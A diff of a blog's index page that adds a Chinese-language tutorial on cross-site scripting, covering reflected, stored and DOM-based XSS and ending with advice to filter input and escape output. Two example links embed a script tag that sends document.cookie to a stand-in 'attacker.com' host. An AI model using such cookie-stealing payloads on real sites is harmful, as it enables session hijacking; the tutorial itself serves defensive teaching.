@@ -294,6 +294,204 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="tomasran.space/archives/oWZgIdOs5O2rjSUngSRMQg/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="TomasRan">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="http://o6lqh5p0j.bkt.clouddn.com/10016040.jpeg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="The World of TomasRan">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="The World of TomasRan" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/archives/oWZgIdOs5O2rjSUngSRMQg/" itemprop="url">
+                  web开发的职业素养：拒绝XSS
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-02T10:48:41+08:00">
+                2017-06-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/category/Investigation/" itemprop="url" rel="index">
+                    <span itemprop="name">Investigation</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <a href="/archives/oWZgIdOs5O2rjSUngSRMQg/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="archives/oWZgIdOs5O2rjSUngSRMQg/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+		  
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+        <div class="post-gallery" itemscope itemtype="http://schema.org/ImageGallery">
+          
+          
+            <div class="post-gallery-row">
+              <a class="post-gallery-img fancybox"
+                 href="http://o6lqh5p0j.bkt.clouddn.com/cross-site-scripting-my-first-xss-attack.png" rel="gallery_cj3f9gnog000w4p02y3zaowxp"
+                 itemscope itemtype="http://schema.org/ImageObject" itemprop="url">
+                <img src="http://o6lqh5p0j.bkt.clouddn.com/cross-site-scripting-my-first-xss-attack.png" itemprop="contentUrl"/>
+              </a>
+            
+          
+
+          
+          </div>
+        </div>
+      
+
+      
+        
+          
+            <h3 id="XSS攻击简述"><a href="#XSS攻击简述" class="headerlink" title="XSS攻击简述"></a>XSS攻击简述</h3><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>XSS攻击的全称是 Cross Site Scripting（跨站脚本攻击），为了避免和样式表CSS混淆而简写为XSS（既生瑜何生亮 :&lt;）。</p>
+<h4 id="攻击目的"><a href="#攻击目的" class="headerlink" title="攻击目的"></a>攻击目的</h4><p>XSS攻击使用web应用，服务器，或者所依赖的插件系统的已知漏洞进行攻击。攻击者通过一些手段，将一些恶意内容，比如js脚本，插入到受攻击的网站。用户使用浏览器进行访问时就会受到攻击。</p>
+<p>那么受到攻击有什么危害呢？对用户来讲，比较常见的就是受害者网站的cookie、session等敏感数据遭到泄露（这些数据一般保存着用户登陆状态等信息，攻击者拿到这些就可以登陆用户的账号随心所欲的操作）；而对于网站来讲，也许会影响用户体验，包括而不限于可能因此遭到DOS攻击等等。危害性不容小觑。</p>
+<p><img src="http://o6lqh5p0j.bkt.clouddn.com/xss-attack2.png" alt=""></p>
+<h4 id="在web安全中的地位"><a href="#在web安全中的地位" class="headerlink" title="在web安全中的地位"></a>在web安全中的地位</h4><p>很多网站都爆发过XSS漏洞，其中不乏互联网巨头，比如Twitter，Facebook，YouTube等等，虽然在互联网安全中已经受到了相当的重视（如果想要了解web中目前比较关注的安全问题，<a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" rel="external">OWASP Top 10</a> 千千万万不要错过，它绝对是你在网站安全建设过程中的绝佳帮手），但是大量的XSS漏洞仍在前赴后继。或是缺少经验，或是用户数据并不十分敏感，亦或是互联网风暴席卷而来时疯了一样的迭代速度所限制的安全投入。</p>
+<h3 id="XSS攻击的类型"><a href="#XSS攻击的类型" class="headerlink" title="XSS攻击的类型"></a>XSS攻击的类型</h3><p>XSS攻击一般总结为如下三类，第三类攻击可能并不常见一些，在此也稍作说明以示全貌（有时也被划分为两大类：持久化和非持久化的XSS攻击）。</p>
+<h4 id="基于反射的攻击（非持久化）"><a href="#基于反射的攻击（非持久化）" class="headerlink" title="基于反射的攻击（非持久化）"></a>基于反射的攻击（非持久化）</h4><p>基于反射的XSS攻击一般是服务器端根据用户的输入或者查询条件返回了带有恶意脚本的结果并在客户端执行。这种漏洞常见于各种搜索引擎之中。</p>
+<h5 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h5><p>比如我们在亚马逊的搜索栏中输入以下图示代码：</p>
+<p><img src="http://o6lqh5p0j.bkt.clouddn.com/Snip20170602_3.png" alt=""></p>
+<p>后端服务器接收到用户输入之后进行查询，发现查询不到类似结果，于是返回如下：</p>
+<p><img src="http://o6lqh5p0j.bkt.clouddn.com/Snip20170602_4.png" alt=""></p>
+<p>当然了，亚马逊并不存在XSS漏洞，这是正常的结果。那么存在XSS漏洞的搜索是如何表现的呢？</p>
+<p>以上述流程为例，当我们在搜索栏中输入对应的恶意脚本代码，服务器端进行处理，当未找到匹配内容时简单返回我们输入的查询字符串。那么，这时候如果网站前端或者服务器端没有对查询字符串做恰当的处理，只是简单返回并插入到页面中，那这段恶意脚本代码很可能被当做正常的script标签解释执行。后果很明显，我们泄露了自己账户的cookie。</p>
+<p>那么攻击者是如何进行攻击的呢？他自然不是站在你身旁，威胁你输入上面的脚本，那还不如自己亲自去查看来的迅速。他在发现网站存在基于反射的XSS漏洞之后，通过某种方式给你提供下面一条链接，将恶意代码塞入查询条件中，如下例的’field_keywords’字段，诱导你去点击：</p>
+<p><code>https://www.amazon.cn/s/ref=nb_sb_noss?__mk_zh_CN=%E4%BA%9A%E9%A9%AC%E9%80%8A%E7%BD%91%E7%AB%99&amp;url=search-alias%3Daps&amp;field-keywords=%3Cscript+src%3D%27attacker.com%3Fcookie%3D%27+%2B+document.cookie%3E%3C%2Fscript%3E&amp;rh=i%3Aaps%2Ck%3A%3Cscript+src%3D%27attacker.com%3Fcookie%3D%27+%2B+document.cookie%3E%3C%2Fscript%3E</code></p>
+<p>而当你点击的片刻，你对应网站的cookie也就泄露了。</p>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这就是基于反射的XSS攻击，因为攻击代码并不是存储在受攻击网站的服务器上，也称之为非持久化攻击。攻击的代码一般在服务器端的response中可以找见。</p>
+<p><img src="http://o6lqh5p0j.bkt.clouddn.com/reflected-xss.png" alt=""></p>
+<h4 id="基于存储的攻击"><a href="#基于存储的攻击" class="headerlink" title="基于存储的攻击"></a>基于存储的攻击</h4><p>基于存储的XSS攻击也是向目标网站注入可执行脚本，但是攻击者的恶意代码会被存储到网站服务器上，因此划分为基于存储的XSS攻击。这种漏洞常见于一般的社交网站的评论系统等。</p>
+<h5 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h5><p>我们去百度贴吧上回帖，回帖的内容是一段恶意的脚本代码，我们点击发表。</p>
+<p><img src="http://o6lqh5p0j.bkt.clouddn.com/Snip20170602_5.png" alt=""></p>
+<p>我们的评论也就被后端服务器存储到数据库中。接下来我们去查看刚才发表的评论：</p>
+<p><img src="http://o6lqh5p0j.bkt.clouddn.com/Snip20170602_7.png" alt=""></p>
+<p>现在的百度贴吧自然也不存在XSS漏洞。我们还是介绍过程。</p>
+<p>那么可以想见，我们的评论被存储到后台数据库中，当别人看帖时，我们的评论自然也会从数据库读取出来展示。那么如果存在XSS漏洞，前后端没有对我们提交的评论进行恰当的处理，这段提交的代码也很可能被当做正常的标签语句解释执行，结果自然也是cookie泄露。</p>
+<h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>基于存储的XSS漏洞的攻击方式一目了然，因为基于存储，属于一种持久化攻击。这种XSS攻击，攻击者的代码从服务器端返回的response中取得。</p>
+<p><img src="http://o6lqh5p0j.bkt.clouddn.com/sorted-XSS.png" alt=""></p>
+<h4 id="基于DOM的攻击"><a href="#基于DOM的攻击" class="headerlink" title="基于DOM的攻击"></a>基于DOM的攻击</h4><p>基于DOM的攻击可以说是基于反射的XSS攻击的子类，它也是非持久化的。它的特别之处就在于服务端并不会接触到攻击的脚本，攻击由客户端代码执行之后发生。</p>
+<h5 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h5><p>攻击者向受害者发送了一个攻击连接：</p>
+<p><code>http://some.site/page.html?default&lt;script+src%3Dattacker.com%3Fcookie%3Ddocument.cookie&gt;&lt;%2Fscript&gt;</code></p>
+<p>当受害者点击这个链接时，便会向服务器端发送请求，服务器端返回资源、数据，但并没有接触url中的default参数。</p>
+<p>这个default参数有什么用呢？它被本地的js代码读取执行，将参数对应的值插入页面，由于没有对参数值做恰当处理，浏览器可能会将这段恶意代码解释执行，于是触发了XSS攻击。</p>
+<h5 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h5><p>基于DOM的漏洞并不是很常见，服务器端不会touch到它，因此与基于反射的XSS攻击有所不同，它是本地js代码的执行漏洞，服务器端并不能采取有效措施解决它而是依赖于客户端代码。</p>
+<h3 id="如何防御XSS漏洞"><a href="#如何防御XSS漏洞" class="headerlink" title="如何防御XSS漏洞"></a>如何防御XSS漏洞</h3><p>通过以上详述，我们应该可以理解到所谓的XSS攻击主要是因为浏览器端错误执行了恶意的脚本所致。我们所要做的工作自然就是杜绝这些恶意的脚本（比如针对带有恶意脚本的请求拒绝服务），或者将这些脚本转化为浏览器不会执行的文本（也就是转义）。</p>
+<p>最稳妥的考虑方式是将任何数据都视为不可信任，根据数据要置于的上下文都进行恰当的转义。退一步当然也可以划分信任数据域和不信任数据域分而治之。</p>
+<p>这样一个原则在解决XSS漏洞时也具有很强的适用性：过滤输入，转义输出。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+
+		<! -- 添加微信图标 -->
+		    
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="tomasran.space/archives/dsFzdQCcuQr1iO8ubvifYQ/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -860,7 +1058,7 @@
           
             <div class="post-gallery-row">
               <a class="post-gallery-img fancybox"
-                 href="http://o6lqh5p0j.bkt.clouddn.com/time-for-review.jpg" rel="gallery_cj1556iks000shp0239frpx5c"
+                 href="http://o6lqh5p0j.bkt.clouddn.com/time-for-review.jpg" rel="gallery_cj3f9gnnz000k4p02321i0cbj"
                  itemscope itemtype="http://schema.org/ImageObject" itemprop="url">
                 <img src="http://o6lqh5p0j.bkt.clouddn.com/time-for-review.jpg" itemprop="contentUrl"/>
               </a>
@@ -1031,7 +1229,7 @@
           
             <div class="post-gallery-row">
               <a class="post-gallery-img fancybox"
-                 href="http://o6lqh5p0j.bkt.clouddn.com/functional-javascript-programming-1.png" rel="gallery_cj1556il5000zhp02s2s28xct"
+                 href="http://o6lqh5p0j.bkt.clouddn.com/functional-javascript-programming-1.png" rel="gallery_cj3f9gno5000q4p02yuod2f5r"
                  itemscope itemtype="http://schema.org/ImageObject" itemprop="url">
                 <img src="http://o6lqh5p0j.bkt.clouddn.com/functional-javascript-programming-1.png" itemprop="contentUrl"/>
               </a>
@@ -1199,7 +1397,7 @@
           
             <div class="post-gallery-row">
               <a class="post-gallery-img fancybox"
-                 href="http://o6lqh5p0j.bkt.clouddn.com/238461__binary-code_p.jpg" rel="gallery_cj1556ikm000mhp02p7zj7qre"
+                 href="http://o6lqh5p0j.bkt.clouddn.com/238461__binary-code_p.jpg" rel="gallery_cj3f9gno7000r4p02pac2fjlr"
                  itemscope itemtype="http://schema.org/ImageObject" itemprop="url">
                 <img src="http://o6lqh5p0j.bkt.clouddn.com/238461__binary-code_p.jpg" itemprop="contentUrl"/>
               </a>
@@ -1517,7 +1715,7 @@
           
             <div class="post-gallery-row">
               <a class="post-gallery-img fancybox"
-                 href="http://o6lqh5p0j.bkt.clouddn.com/%E6%97%B6%E5%88%BB%E6%B3%A8%E6%84%8F%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%9C%88%E5%A4%8D%E6%9D%82%E5%BA%A6.png" rel="gallery_cj1556ikf000ghp029i04v1nj"
+                 href="http://o6lqh5p0j.bkt.clouddn.com/%E6%97%B6%E5%88%BB%E6%B3%A8%E6%84%8F%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%9C%88%E5%A4%8D%E6%9D%82%E5%BA%A6.png" rel="gallery_cj3f9gnnc000c4p02eet2uino"
                  itemscope itemtype="http://schema.org/ImageObject" itemprop="url">
                 <img src="http://o6lqh5p0j.bkt.clouddn.com/%E6%97%B6%E5%88%BB%E6%B3%A8%E6%84%8F%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%9C%88%E5%A4%8D%E6%9D%82%E5%BA%A6.png" itemprop="contentUrl"/>
               </a>
@@ -1725,158 +1923,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="tomasran.space/archives/1lYfLLOTOzer67ZuqHJRlg/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="TomasRan">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="http://o6lqh5p0j.bkt.clouddn.com/10016040.jpeg">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="The World of TomasRan">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="The World of TomasRan" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/archives/1lYfLLOTOzer67ZuqHJRlg/" itemprop="url">
-                  关于字符集、编码字符集和字符编码
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-30T16:04:03+08:00">
-                2016-06-30
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-              <span class="post-meta-divider">|</span>
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/Investigation/" itemprop="url" rel="index">
-                    <span itemprop="name">Investigation</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <a href="/archives/1lYfLLOTOzer67ZuqHJRlg/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="archives/1lYfLLOTOzer67ZuqHJRlg/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-		  
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="准备好开始"><a href="#准备好开始" class="headerlink" title="准备好开始"></a>准备好开始</h2><p>我不是偏执于概念，只是很多时候只有对一个词汇或者术语的定义有着明确的把握之后才会自信地去使用它们。我觉得这不至于是一件钻牛角尖的坏事情，能够清晰地辨别它们或者准确地使用它们至少令自己心里踏实，不会迷惑于其它叙述者的七嘴八舌。</p>
-<p>因此，在比较充分地接触编码这一堆看上去令人头晕脑胀的事情之前，我想有必要先明确几个概念，相信我，这将有助于我们理清思绪。</p>
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/archives/1lYfLLOTOzer67ZuqHJRlg/" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-
-		<! -- 添加微信图标 -->
-		    
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1922,7 +1968,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-count">14</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1939,7 +1985,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">31</span>
+                <span class="site-state-item-count">32</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
